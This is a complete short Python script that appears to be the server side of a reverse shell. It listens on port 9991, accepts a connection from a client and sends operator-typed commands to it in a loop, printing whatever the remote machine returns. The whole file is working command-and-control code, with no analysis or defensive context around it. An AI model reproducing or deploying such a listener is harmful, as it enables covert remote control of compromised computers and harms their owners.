import socket
import sys

# create a socket
def create_socket():
    try:
        global host
        global port
        global soc

        host = ""
        port = 9991
        soc = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        sys.exit()

# binding the socket to the port and host, then listening for connections
def bind_socket():
    try:
        global host
        global port
        global soc

        print(f"Binding the port {port}")

        soc.bind((host, port))
        soc.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\nRetrying...")
        bind_socket()

# accepting the connection from client
def socket_accept():
    conn, address = soc.accept()
    print(f"Connection established! | IP {address[0]} | Port {address[1]}")
    send_command(conn)
    conn.close()

# sending commands to the client
def send_command(conn):
    while True:
        cmd = input("Enter command: ")
        if cmd == 'quit':
            conn.close()
            soc.close()
            sys.exit()

        if len(cmd.strip()) > 0:
            conn.send(str.encode(cmd))
            client_response = conn.recv(2048).decode("utf-8")
            print(client_response, end="")

# main function
def main():
    create_socket()
    bind_socket()
    socket_accept()

if __name__ == "__main__":
    main()
